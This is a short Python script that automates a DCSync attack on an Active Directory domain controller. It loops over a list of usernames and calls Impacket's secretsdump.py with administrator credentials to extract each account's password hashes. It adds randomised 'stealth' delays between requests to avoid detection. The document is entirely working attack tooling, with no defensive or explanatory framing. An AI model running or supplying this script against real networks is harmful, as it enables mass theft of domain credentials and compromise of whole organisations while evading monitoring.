import subprocess
import time
import random

# ---- Config ----
domain = "yourdomain.local"
username = "Administrator"
password = "YourP@ssw0rd!"
dc_ip = "192.168.1.10"
userlist_file = "users.txt"
secretsdump_path = "/path/to/impacket/examples/secretsdump.py"  # 👈 Update this path

# ---- Load users ----
with open(userlist_file, "r") as f:
    users = [line.strip() for line in f if line.strip()]

# ---- Loop through users ----
for user in users:
    print(f"\n[+] DCSyncing user: {user}")
    
    cmd = [
        "python3",
        secretsdump_path,
        f"{domain}/{username}:{password}@{dc_ip}",
        "--just-dc-user", user
    ]

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        print(result.stdout)
        if result.stderr:
            print(f"[!] STDERR for {user}:\n{result.stderr}")
    except Exception as e:
        print(f"[!] Error on user {user}: {e}")
    
    # Stealth delay (1–2 seconds)
    sleep_time = random.uniform(1, 2)
    print(f"[*] Sleeping for {sleep_time:.2f} seconds...")
    time.sleep(sleep_time)

print("\n[✓] Finished DCSync for all users.")
